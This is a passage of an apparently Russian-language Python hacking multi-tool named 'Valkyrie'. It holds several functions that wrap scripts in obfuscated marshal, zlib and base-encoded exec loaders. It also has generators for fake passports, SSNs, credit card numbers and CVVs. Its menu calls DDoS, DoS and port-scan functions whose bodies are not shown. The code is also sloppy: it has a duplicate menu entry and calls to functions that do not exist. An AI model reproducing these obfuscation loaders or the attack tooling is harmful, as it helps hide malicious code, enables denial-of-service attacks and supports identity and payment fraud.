        data = "exec((lambda __: __import__('marshal').loads(__import__('base64').b32decode(__[::-1])))(%s))" % repr(base64.b32encode(marshal.dumps(compile(data.encode('utf8'), '<x>', 'exec')))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def encode_marshal_base64():
    clear_console()
    try: 
        file = eval(_input % Write.Input(" [-]File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('marshal').loads(__import__('base64').b64decode(__[::-1])))(%s))" % repr(base64.b64encode(marshal.dumps(compile(data.encode('utf8'), '<x>', 'exec')))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))


def encode_marshal_zlib_base16():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1])))(%s))" % repr(base64.b16encode(zlib.compress(marshal.dumps(compile(data.encode('utf8'), '<x>', 'exec'))))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))


def encode_marshal_zlib_base32():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1])))(%s))" % repr(base64.b32encode(zlib.compress(marshal.dumps(compile(data.encode('utf8'), '<x>', 'exec'))))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))


def encode_marshal_zlib_base64():
    clear_console()
    try:
        file = eval(_input % Write.Input(" [-] File Name (press Enter) : ", Colors.green_to_white, interval=0.005))
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        data = "exec((lambda __: __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))(%s))" % repr(base64.b64encode(zlib.compress(marshal.dumps(compile(data.encode('utf8'), '<x>', 'exec'))))[::-1])
        with open(output, 'w') as f:
            f.write(note + data)
        print(Write.Input("\n[-] Successfully Encrypted %s" % file, Colors.green_to_white, interval=0.005))
        print(Write.Input("[-] Saved as %s" % output, Colors.green_to_white, interval=0.005))
        FileSize(output)
    except (ValueError, IOError):
        sys.exit(Write.Input("\nInvalid Option or File Not Found!", Colors.red_to_white, interval=0.005))

def temp_mail_function():
    def create_temp_mail():
        local_part = input("Введите имя: ")
        domain = "rteet.com"
        email = f"{local_part}@{domain}"
        return email

    def get_mailbox_messages(login, domain):
        response = requests.get(f'https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}')
        if response.status_code == 200:
            return response.json()
        else:
            print(Colorate.Horizontal(Colors.red_to_white, "Не удалось получить сообщения."))
            return []

    def get_message_details(login, domain, message_id):
        response = requests.get(f'https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={message_id}')
        if response.status_code == 200:
            return response.json()
        else:
            print(Colorate.Horizontal(Colors.red_to_white, "Не удалось получить детали сообщения."))
            return None

    def extract_text_from_html(html_content):
        soup = BeautifulSoup(html_content, 'html.parser')
        return soup.get_text()

    def save_message_to_file(filename, sender, date, subject, body):
        with open(filename, 'a', encoding='utf-8') as file:
            file.write(f'От: {sender}\n')
            file.write(f'Дата: {date}\n')
            file.write(f'Тема: {subject}\n')
            file.write(f'Письмо: {body}\n\n')

    def adjust_time(date_str):
        date_obj = datetime.strptime(date_str, "%Y-%m-%d %H:%M:%S")
        adjusted_time = date_obj + timedelta(hours=3)
        return adjusted_time.strftime("%Y-%m-%d %H:%M:%S")

    os.system('cls' if os.name == 'nt' else 'clear')
    email = create_temp_mail()
    if email:
        print(Colorate.Horizontal(Colors.green_to_white, f'Используется временный почтовый ящик: {email}'))
        
        login, domain = email.split('@')
        processed_messages = set()

        print(Colorate.Horizontal(Colors.green_to_white, 'Проверка новых сообщений...'))
        while True:
            messages = get_mailbox_messages(login, domain)
            if messages:
                for message in messages:
                    if message['id'] not in processed_messages:
                        message_details = get_message_details(login, domain, message['id'])
                        if message_details:
                            sender = message_details["from"]
                            date = adjust_time(message_details["date"])
                            subject = message_details["subject"]
                            message_body = extract_text_from_html(message_details["body"])
                            save_message_to_file('emails.txt', sender, date, subject, message_body)
                            
                            print()
                            print(Colorate.Horizontal(Colors.green_to_white, f'От: {sender}'))
                            print(Colorate.Horizontal(Colors.green_to_white, f'Дата: {date}'))
                            print(Colorate.Horizontal(Colors.green_to_white, f'Тема: {subject}'))
                            print(Colorate.Horizontal(Colors.green_to_white, f'Письмо: {message_body}\n'))
                        
                        processed_messages.add(message['id'])
            time.sleep(5)

def simple_encode():
    clear_console()
    try:
        file = eval(_input % "File Name : ")
        with open(file, 'r') as f:
            data = f.read()
        output = file.lower().replace('.py', '') + '_enc.py'
        encoded_data = compile(data, '<x>', 'exec')
        with open(output, 'w') as f:
            f.write(note + repr(encoded_data))
        print(_success % file)
        print(_saved % output)
        FileSize(output)
    except (ValueError, IOError):
        sys.exit("\nInvalid Option or File Not Found!")

def show_error(text):
    print(Colorate.Horizontal(Colors.red_to_white, text))

def pause():
    input("\nНажмите Enter для продолжения...")

def list_files_in_directory(directory):
    print(Colorate.Horizontal(Colors.green_to_white, "Список файлов и папок в текущей директории:"))
    files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
    for index, file in enumerate(files):
        print(Colorate.Horizontal(Colors.green_to_white, f"{index + 1}. {file}"))
    return files

def select_file_from_directory(directory):
    files = list_files_in_directory(directory)
    print(Colorate.Horizontal(Colors.green_to_white, "Введите номер файла для выбора: "))
    choice = input().strip()
    try:
        index = int(choice) - 1
        if 0 <= index < len(files):
            return Path(directory) / files[index]
        else:
            show_error("Некорректный выбор.")
            pause()
            return None
    except ValueError:
        show_error("Некорректный ввод.")
        pause()
        return None

def select_file_or_folder():
    print(Colorate.Horizontal(Colors.green_to_white, "Вы хотите загрузить файл из текущей директории (1) или указать путь к файлу (2)? Введите 1 или 2:"))
    choice = input().strip()
    
    if choice == '1':
        current_directory = os.getcwd()
        return select_file_from_directory(current_directory)
    
    elif choice == '2':
        print(Colorate.Horizontal(Colors.green_to_white, "Введите полный путь к файлу или папке:"))
        path = input().strip()
        path_obj = Path(path)
        if path_obj.exists():
            return path_obj
        else:
            show_error("Путь не найден.")
            pause()
            return None
    
    else:
        show_error("Некорректный выбор.")
        pause()
        return None

def add_password_to_zip(file_path, password):
    zip_path = file_path.with_suffix('.zip')
    
    try:
        with pyzipper.AESZipFile(zip_path, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
            zf.setpassword(password.encode())
            
            if file_path.is_file():
                zf.write(file_path, file_path.name)
            elif file_path.is_dir():
                for root, dirs, files in os.walk(file_path):
                    for file in files:
                        full_path = Path(root) / file
                        arcname = full_path.relative_to(file_path)
                        zf.write(full_path, arcname)
        
        print(Colorate.Horizontal(Colors.green_to_white, f'Файл/папка успешно заархивирован(а) с паролем в {zip_path}'))
        pause()
    except Exception as e:
        show_error(f'Ошибка при создании архива: {e}')
        pause()

def password_dopavit():
    path = select_file_or_folder()
    if path:
        print(Colorate.Horizontal(Colors.green_to_white, "Введите пароль для защиты (Ввводимое будет не видно!): "))
        password = getpass()
        add_password_to_zip(path, password)
    else:
        show_error("Не удалось выбрать файл или папку.")
        pause()

def generate_russian_phone():
    prefix = "+7"
    code = random.randint(900, 999)
    number = random.randint(1000000, 9999999)
    return f"{prefix} ({code}) {number}"

def generate_kazakh_phone():
    prefix = "+7"
    code = random.randint(700, 799)
    number = random.randint(1000000, 9999999)
    return f"{prefix} ({code}) {number}"

def generate_ukrainian_phone():
    prefix = "+380"
    code = random.randint(50, 99)
    number = random.randint(1000000, 9999999)
    return f"{prefix} ({code}) {number}"

def generate_belarusian_phone():
    prefix = "+375"
    code = random.randint(25, 44)
    number = random.randint(1000000, 9999999)
    return f"{prefix} ({code}) {number}"

def generate_uzbek_phone():
    prefix = "+998"
    code = random.randint(71, 99)
    number = random.randint(1000000, 9999999)
    return f"{prefix} ({code}) {number}"

def generate_georgian_phone():
    prefix = "+995"
    code = random.randint(32, 79)
    number = random.randint(1000000, 9999999)
    return f"{prefix} ({code}) {number}"

def generate_russian_passport():
    series = random.randint(1000, 9999)
    number = random.randint(100000, 999999)
    return f"{series} {number}"

def generate_kazakh_passport():
    series = random.randint(1000, 9999)
    number = random.randint(100000, 999999)
    return f"{series} {number}"

def generate_ukrainian_passport():
    series = random.randint(1000, 9999)
    number = random.randint(100000, 999999)
    return f"{series} {number}"

def generate_qr_code():
    data = input("Введите данные для QR-кода: ")
    img = qrcode.make(data)
    img.save("qrcode.png")
    print("QR-код сохранен как qrcode.png")

def generate_discord_token():
    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(59))

def generate_mullvad_key():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))

def generate_random_api_token():
    return secrets.token_hex(32)

def generate_random_name():
    return ''.join(secrets.choice(string.ascii_letters) for _ in range(10))

def generate_random_address():
    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(15))

def generate_random_password():
    return ''.join(secrets.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(12))

def generate_random_postal_code():
    return ''.join(secrets.choice(string.digits) for _ in range(6))

def generate_random_login():
    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(8))

def generate_random_id():
    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))

def generate_random_email():
    return ''.join(secrets.choice(string.ascii_letters) for _ in range(5)) + '@example.com'

def generate_username():
    return fake.user_name()

def generate_password(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_email():
    return fake.email()

def generate_ip():
    return fake.ipv4()

def generate_url():
    return fake.url()

def generate_mac():
    return fake.mac_address()

def generate_uuid():
    return str(uuid.uuid4())

def generate_hex_color():
    return "#{:06x}".format(random.randint(0, 0xFFFFFF))

def generate_rgb_color():
    return "rgb({}, {}, {})".format(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

def generate_barcode():
    return fake.ean13()

def generate_jwt():
    header = json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
    payload = json.dumps({"user": "random_user", "admin": False}).encode()
    signature = hashlib.sha256(header + b"." + payload).hexdigest()
    return f"{header.decode('utf-8')}.{payload.decode('utf-8')}.{signature}"

def generate_filename():
    return fake.file_name()

def generate_file_content():
    return fake.text()

def generate_zip_code():
    return fake.zipcode()

def generate_us_phone():
    return fake.phone_number()

def generate_us_address():
    return fake.address()

def generate_vin():
    return fake.vin()

def generate_bin():
    return fake.credit_card_provider()

def generate_inn():
    return fake.random_number(digits=12, fix_len=True)

def generate_ssn():
    return fake.ssn()

def generate_credit_card():
    return fake.credit_card_number()

def generate_cvv():
    return fake.credit_card_security_code()

def generate_iban():
    return fake.iban()

def generate_swift():
    return fake.swift()

def generate_bitcoin_address():
    return fake.cryptocurrency_address()

def generate_ethereum_address():
    return "0x" + "".join(random.choices("0123456789abcdef", k=40))

def generate_comment():
    return fake.sentence()

def generate_message():
    return fake.text()

def generate_login():
    return fake.user_name()

def generate_random_password():
    return generate_password()

def generate_nickname():
    return fake.user_name()

def generate_json_string():
    return json.dumps(fake.pydict())

def generate_xml_string():
    return '<root><element>{}</element></root>'.format(fake.word())

def generate_random_number():
    return random.randint(1, 1000)

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_random_characters():
    return ''.join(random.choices(string.ascii_letters + string.punctuation + string.digits, k=10))

def generate_random_number_list(length=10):
    return [random.randint(1, 100) for _ in range(length)]

def generate_random_string_list(length=10):
    return [fake.word() for _ in range(length)]

def generate_random_datetime():
    return fake.date_time()

def generate_random_time_interval():
    start = fake.date_time()
    end = fake.date_time_between(start_date=start)
    return (start, end)

def generate_email_with_domain(domain="example.com"):
    return f"{fake.user_name()}@{domain}"

def generate_password_with_params(length=12, include_digits=True, include_special_chars=True):
    chars = string.ascii_letters
    if include_digits:
        chars += string.digits
    if include_special_chars:
        chars += string.punctuation
    return ''.join(random.choice(chars) for _ in range(length))

def generate_string_of_length(length=10):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_activation_code(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def generate_auth_token():
    return hashlib.sha256(str(random.random()).encode()).hexdigest()

def generate_chat_message():
    return fake.sentence()

def generate_username():
    return fake.user_name()

def generate_character_name():
    return fake.name()

def generate_alias():
    return fake.user_name()

def generate_nickname():
    return fake.user_name()

def generate_account_number(length=12):
    return ''.join(random.choices(string.digits, k=length))

def generate_bic():
    return fake.bban()

def generate_imei():
    return fake.imei()

def generate_serial_number(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def generate_license_key():
    return '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=5)) for _ in range(5))

def generate_coupon():
    return '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(4))

def generate_game_invite():
    return fake.uuid4()

def generate_wifi_password(length=12):
    return generate_password_with_params(length=length)

def generate_encryption_key(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_session_id():
    return fake.uuid4()

def generate_user_id():
    return fake.uuid4()

def generate_confirmation_code(length=6):
    return ''.join(random.choices(string.digits, k=length))

def generate_fax_number():
    return fake.phone_number()

def generate_temp_email():
    return fake.email()

def generate_postal_address():
    return fake.address()

def generate_db_id():
    return fake.uuid4()

def generate_comment():
    return fake.sentence()

def generate_review():
    return fake.text()

def generate_survey_response():
    return fake.sentence()

def generate_tin():
    return fake.ssn()

def generate_isin():
    return fake.isin()

def generate_api_key(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_secret_key(length=64):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_public_key():
    return fake.ssn()

def generate_private_key():
    return fake.ssn()

def generate_pgp_key():
    return fake.ssn()

def generate_crypto_address():
    return fake.cryptocurrency_address()

def generate_invitation_code(length=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def generate_transaction_id():
    return fake.uuid4()

def generate_chat_id():
    return fake.uuid4()

def donation_link():
    clear_console()
    url = "https://t.me/send?start=IV8sqnZMFJ6A" 
    message = "Спасибо за поддержку! Открывается страница доната..."
    print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter(message)))
    webbrowser.open(url)
    input(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Нажмите Enter, чтобы продолжить...")))


def execute_function(choice):
    phone_info = PhoneNumberInfo()
    if choice == 1:
        ip = input(Colorate.Horizontal(Colors.green_to_white, "\nВведите IP для поиска: "))
        result = search_ip(ip)
        
        if isinstance(result, str):
            print(Colorate.Horizontal(Colors.green_to_white, f"\n{result}"))
        else:
            print(Colorate.Horizontal(Colors.green_to_white, f"""
            IP: {result.get('query')}
            Страна: {result.get('country')}
            Регион: {result.get('regionName')}
            Город: {result.get('city')}
            ZIP: {result.get('zip')}
            Широта: {result.get('lat')}
            Долгота: {result.get('lon')}
            Провайдер: {result.get('isp')}
            Организация: {result.get('org')}
            """))
    elif choice == 2:
        domain = input(Colorate.Horizontal(Colors.green_to_white, "\nВведите домен для поиска: "))
        result = search_domain(domain)
        
        if isinstance(result, str):
            print(Colorate.Horizontal(Colors.green_to_white, f"\n{result}"))
        else:
            print(Colorate.Horizontal(Colors.green_to_white, f"""
            Домен: {domain}
            Регистратор: {result.registrar}
            Дата создания: {result.creation_date}
            Дата окончания: {result.expiration_date}
            Обновлен: {result.updated_date}
            Статус: {result.status}
            Серверы имен: {result.name_servers}
            """))
    elif choice == 3:
        search_number()
    elif choice == 4:
        query = input(Colorate.Horizontal(Colors.green_to_white, "\nВведите запрос для поиска в Википедии: "))
        result = search_wikipedia(query)        
        print(Colorate.Horizontal(Colors.green_to_white, f"\n{result}"))
    elif choice == 5:
        print(search_database())
    elif choice == 6:       
        result = process_personal_data()
        if result:  
            print(result)
        else:
            print("Ошибка при обработке данных.")
    elif choice == 7:
        print(text_banword())
    elif choice == 8:
        print(web_crawler())
    elif choice == 9:
        print(check_my_ip())
    elif choice == 10:
              clear_console()
              email = input(Colorate.Horizontal(Colors.green_to_white, " Введите адрес электронной почты: "))
              email_info(email)
    elif choice == 11:
        print(get_mac_info())
    elif choice == 12:
        print(check_internet_speed())
    elif choice == 13:
        print(translate_text())
    elif choice == 14:
        print(scrape_proxies())
    elif choice == 15:
        print(get_hwid())
    elif choice == 16:
        print(validate_email_address())
    elif choice == 17:
        print(check_website_status())
    elif choice == 18:
        print(shorten_url())
    elif choice == 19:
        print(search_vehicle_by_vin())
    elif choice == 20:
        print(send_email())
    elif choice == 21:
        print(port_scan(ip))
    elif choice == 22:
        print(base64_process())
    elif choice == 23:
        print(ddos_attack())
    elif choice == 24:
        print(initiate_dos_attack())
    elif choice == 25:
        print(upload_to_gist())
    elif choice == 26:
        print(compress_image())
    elif choice == 27:
            repo_url = input("Enter GitHub repository URL: ")
            github_repo_parser(repo_url)
    elif choice == 28:
            url = input("Enter URL: ")
            html_parser(url)
    elif choice == 29:
        print(system_monitor())
    elif choice == 30:
        print(process_list())
    elif choice == 31:
       reporter_tg()
       input(Colorate.Vertical(Colors.green_to_blue, "\n Нажмите Enter, чтобы вернуться в главное меню."))
    elif choice == 32:
        print( py_to_exe())
    elif choice == 33:
        print(network_traffic_monitor())
    elif choice == 34:
        print(system_usage_monitor())
    elif choice == 35:
        print(disk_usage_monitor())
    elif choice == 36:
        print(check_package_updates())
    elif choice == 37:
        print(check_virus_total())
    elif choice == 38:
        print(check_ssl_cert())
    elif choice == 39:
        print(get_whois_info())
    elif choice == 40:
        print( get_ip_location())
    elif choice == 41:
        print(monitor_file_activity())
    elif choice == 42:
        print(convert_pdf_to_word())
    elif choice == 43:
        directory_to_scan = input(Colorate.Horizontal(Colors.green_to_white, "Введите путь к директории для поиска дубликатов: "))
        find_and_remove_duplicates(directory_to_scan)
    elif choice == 44:
        print(extract_text_from_image())
    elif choice == 45:
        print(parse_json_file())
    elif choice == 46:
        print(download_youtube_video())
    elif choice == 47:
        print(download_tiktok_video())
    elif choice == 48:
        print(list_installed_programs())
    elif choice == 49:
        print(get_network_connections())
    elif choice == 50:
        print(get_os_info())
    elif choice == 51:
        print(create_zip_archive())
    elif choice == 52:
        print(create_7z_archive())
    elif choice == 53:
        print(create_rar_archive())
    elif choice == 54:
        print(extract_specific_files())
    elif choice == 55:
        print(decode_qr_code())
    elif choice == 56:
        print(compare_text_files())
    elif choice == 57:
        print(convert_video_to_audio())
    elif choice == 58:
        print(convert_audio_to_text())
    elif choice == 59:
        print(create_gif_from_video())
    elif choice == 60:
        print(gb())
        input(Colorate.Horizontal(Colors.green_to_white, "\n Нажмите Enter, чтобы вернуться в главное меню."))
    elif choice == 61:
        print(nakrut())
        input(Colorate.Horizontal(Colors.green_to_white, "\n Нажмите Enter, чтобы вернуться в главное меню."))
    elif choice == 62:
        print(ano_chat())
        input(Colorate.Horizontal(Colors.green_to_white, "\n Нажмите Enter, чтобы вернуться в главное меню."))
    elif choice == 63:
        print(encode_marshal())
    elif choice == 64:
        print(encode_zlib())
    elif choice == 65:
        print(encode_zlib())
    elif choice == 66:
        print(encode_base16())
    elif choice == 67:
        print(encode_base32())
    elif choice == 68:
        print(encode_base64())
    elif choice == 69:
        print(encode_zlib_base16())
    elif choice == 70:
        print(encode_zlib_base32())
    elif choice == 71:
        print(encode_zlib_base64())
    elif choice == 72:
        print(encode_marshal_zlib())
    elif choice == 73:
        print(encode_marshal_base16())
    elif choice == 74:
        print(encode_marshal_base32())
    elif choice == 75:
        print(encode_marshal_base64())
    elif choice == 76:
        print(encode_marshal_zlib_base16())
    elif choice == 77:
        print(encode_marshal_zlib_base32())
    elif choice == 78:
        print(encode_marshal_zlib_base64())
    elif choice == 78:
        print(simple_encode())
    elif choice == 79:
        print(temp_mail_function())
    elif choice == 80:
        print(password_dopavit())
    elif choice == 101:
        print(generate_russian_phone())
    elif choice == 102:
        print(generate_kazakh_phone())
    elif choice == 103:
        print(generate_ukrainian_phone())
    elif choice == 104:
        print(generate_belarusian_phone())
    elif choice == 105:
        print(generate_uzbek_phone())
    elif choice == 106:
        print(generate_georgian_phone())
    elif choice == 107:
        print(generate_russian_passport())
    elif choice == 108:
        print(generate_kazakh_passport())
    elif choice == 109:
        print(generate_ukrainian_passport())
    elif choice == 110:
        generate_qr_code()
    elif choice == 111:
        print(generate_discord_token())
    elif choice == 112:
        print(generate_mullvad_key())
    elif choice == 113:
        print(generate_random_api_token())
    elif choice == 114:
        print(generate_random_name())
    elif choice == 115:
        print(generate_random_address())
    elif choice == 116:
        print(generate_random_password())
    elif choice == 117:
        print(generate_random_postcode())
    elif choice == 118:
        print(generate_random_login())
    elif choice == 119:
        print(generate_random_id())
    elif choice == 120:
        print(generate_random_email())
    elif choice == 121:
        print(generate_username())
    elif choice == 122:
        print(generate_password())
    elif choice == 123:
        print(generate_email())
    elif choice == 124:
        print(generate_ip())
    elif choice == 125:
        print(generate_url())
    elif choice == 126:
        print(generate_mac())
    elif choice == 127:
        print(generate_uuid())
    elif choice == 128:
        print(generate_hex_color())
    elif choice == 129:
        print(generate_rgb_color())
    elif choice == 130:
        print(generate_barcode())
    elif choice == 131:
        print(generate_jwt())
    elif choice == 132:
        print(generate_filename())
    elif choice == 133:
        print(generate_file_content())
    elif choice == 134:
        print(generate_zip_code())
    elif choice == 135:
        print(generate_us_phone())
    elif choice == 136:
        print(generate_us_address())
    elif choice == 137:
        print(generate_vin())
    elif choice == 138:
        print(generate_bin())
    elif choice == 139:
        print(generate_inn())
    elif choice == 140:
        print(generate_ssn())
    elif choice == 141:
        print(generate_credit_card())
    elif choice == 142:
        print(generate_cvv())
    elif choice == 143:
        print(generate_iban())
    elif choice == 144:
        print(generate_swift())
    elif choice == 145:
        print(generate_bitcoin_address())
    elif choice == 146:
        print(generate_ethereum_address())
    elif choice == 147:
        print(generate_comment())
    elif choice == 148:
        print(generate_message())
    elif choice == 149:
        print(generate_login())
    elif choice == 150:
        print(generate_random_password())
    elif choice == 151:
        print(generate_nickname())
    elif choice == 152:
        print(generate_json_string())
    elif choice == 153:
        print(generate_xml_string())
    elif choice == 154:
        print(generate_random_number())
    elif choice == 155:
        print(generate_random_string())
    elif choice == 156:
        print(generate_random_characters())
    elif choice == 157:
        print(generate_random_number_list())
    elif choice == 158:
        print(generate_random_string_list())
    elif choice == 159:
        print(generate_random_datetime())
    elif choice == 160:
        print(generate_random_time_interval())
    elif choice == 161:
        print(generate_email_with_domain())
    elif choice == 162:
        print(generate_password_with_params())
    elif choice == 163:
        print(generate_string_of_length())
    elif choice == 164:
        print(generate_activation_code())
    elif choice == 165:
        print(generate_authentication_token())
    elif choice == 166:
        print(generate_chat_message())
    elif choice == 167:
        print(generate_username())
    elif choice == 168:
        print(generate_character_name())
    elif choice == 169:
        print(generate_alias())
    elif choice == 170:
        print(generate_nickname())
    elif choice == 171:
        print(generate_account_number())
    elif choice == 172:
        print(generate_bic())
    elif choice == 173:
        print(generate_imei())
    elif choice == 174:
        print(generate_serial_number())
    elif choice == 175:
        print(generate_license_key())
    elif choice == 176:
        print(generate_coupon_code())
    elif choice == 177:
        print(generate_game_invite())
    elif choice == 178:
        print(generate_wifi_password())
    elif choice == 179:
        print(generate_encryption_key())
    elif choice == 180:
        print(generate_session_id())
    elif choice == 181:
        print(generate_user_identifier())
    elif choice == 182:
        print(generate_confirmation_code())
    elif choice == 183:
        print(generate_fax_number())
    elif choice == 184:
        print(generate_disposable_email())
    elif choice == 185:
        print(generate_postal_address())
    elif choice == 186:
        print(generate_database_id())
    elif choice == 187:
        print(generate_comment())
    elif choice == 188:
        print(generate_review())
    elif choice == 189:
        print(generate_survey_response())
    elif choice == 190:
        print(generate_tin())
    elif choice == 191:
        print(generate_isin())
    elif choice == 192:
        print(generate_api_key())
    elif choice == 193:
        print(generate_secret_key())
    elif choice == 194:
        print(generate_public_key())
    elif choice == 195:
        print(generate_private_key())
    elif choice == 196:
        print(generate_pgp_key())
    elif choice == 197:
        print(generate_crypto_address())
    elif choice == 198:
        print(generate_invitation_code())
    elif choice == 199:
        print(generate_transaction_id())
    elif choice == 200:
        print(generate_chat_id())
    elif choice == "next":
        return "next"
    elif choice == "prev":
        return "prev"
    elif choice == "exit":
        return "exit"
    else:
        print("Функция с таким ID не найдена.")



def main():
    current_page = 0
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        display_menu(current_page)
        
        time_now = datetime.now().strftime('%H:%M:%S')
        message = f"╔════════════════════════════════════════════════════════<<\n╚══>>({time_now}) Введите номер функции или команду: "
        gradient_message = Colorate.Horizontal(Colors.green_to_blue, message)
        
        user_input = input(gradient_message).strip().lower()

        if user_input == "exit":
            print(Colorate.Horizontal(Colors.green_to_blue, "Выход из Valkyrie..."))
            break
        elif user_input == "next":
            current_page = change_page(current_page, "next")
        elif user_input == "prev":
            current_page = change_page(current_page, "prev")
        elif user_input == "999":
            donation_link()
        else:
            try:
                function_id = int(user_input)
                if 1 <= function_id <= 158:
                    result = execute_function(function_id)
                  
                    if result == "next":
                        current_page = change_page(current_page, "next")
                    elif result == "prev":
                        current_page = change_page(current_page, "prev")
                    elif result == "exit":
                        print(Colorate.Horizontal(Colors.green_to_blue, "Выход из Valkyrie..."))
                        break
                    else:
                        input(Colorate.Horizontal(Colors.green_to_blue, "Нажмите Enter для продолжения..."))
                else:
                    print(Colorate.Horizontal(Colors.red_to_black, "Функция с таким ID не найдена. Попробуйте снова."))
                    input("Нажмите Enter для продолжения...")
            except ValueError:
                print(Colorate.Horizontal(Colors.red_to_black, "Неверная команда. Пожалуйста, введите 'next', 'prev' или 'exit'."))
                input("Нажмите Enter для продолжения...")

if __name__ == "__main__":
    display_intro()  
    main()